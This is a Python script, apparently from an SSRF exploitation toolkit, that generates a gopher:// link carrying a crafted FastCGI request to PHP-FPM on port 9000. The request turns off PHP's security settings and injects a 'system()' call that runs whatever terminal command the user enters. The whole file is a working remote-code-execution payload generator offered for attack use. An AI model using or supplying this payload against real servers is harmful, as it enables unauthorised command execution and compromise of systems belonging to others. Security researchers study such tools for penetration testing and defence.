import urllib.parse

def FastCGI():
    filename = input("\033[96m" + "Give one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  " + "\033[0m")

    if(not filename):
        filename="/usr/share/php/PEAR.php"

    command=input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
    length=len(command)+52
    char=chr(length)

    data = b"\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e" + bytes([len(str(length))])
    data += b"CONTENT_LENGTH" + str(length).encode() + b"\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
    data += b"disable_functions = \nauto_prepend_file = php://input\x0f" + bytes([len(filename)]) + b"SCRIPT_FILENAME" + filename.encode() + b"\r\x01DOCUMENT_ROOT/"

    temp1 = bytes([len(data) // 256])
    temp2 = bytes([len(data) % 256])
    temp3 = bytes([len(data) % 8])

    end = b"\x00"*(len(data)%8) + b"\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char.encode() + b"\x04\x00"
    end += b"<?php system('" + command.encode() + b"');die('-----Made-by-SpyD3r-----\n');?>\x00\x00\x00\x00"

    start = b"\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01" + temp1 + temp2 + temp3 + b"\x00"

    payload = start + data + end

    def get_payload(payload):
        finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/")
        return "gopher://127.0.0.1:9000/_" + finalpayload

    print("\033[93m" + "\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
    print("\033[04m" + get_payload(payload) + "\033[0m")
    print("\n" + "\033[41m" + "-----------Made-by-SpyD3r-----------" + "\033[0m")
